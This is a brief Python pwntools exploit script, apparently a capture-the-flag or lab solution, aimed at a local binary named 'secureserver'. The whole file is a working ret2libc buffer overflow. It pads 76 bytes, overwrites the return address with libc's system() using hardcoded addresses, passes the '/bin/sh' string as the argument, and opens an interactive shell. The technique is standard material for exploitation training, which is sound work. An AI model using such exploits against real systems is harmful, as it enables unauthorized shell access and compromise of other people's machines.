from pwn import *

io = process('./secureserver')

libc_base = 0xf7d65000
system = libc_base + 0x00524c0
binsh = libc_base + 0x1c9e3c

payload = b'A' * 76
payload += p32(system)
payload += p32(0x0)		# 0x0 Acts as the return address
payload += p32(binsh)

io.sendline(payload)
io.interactive()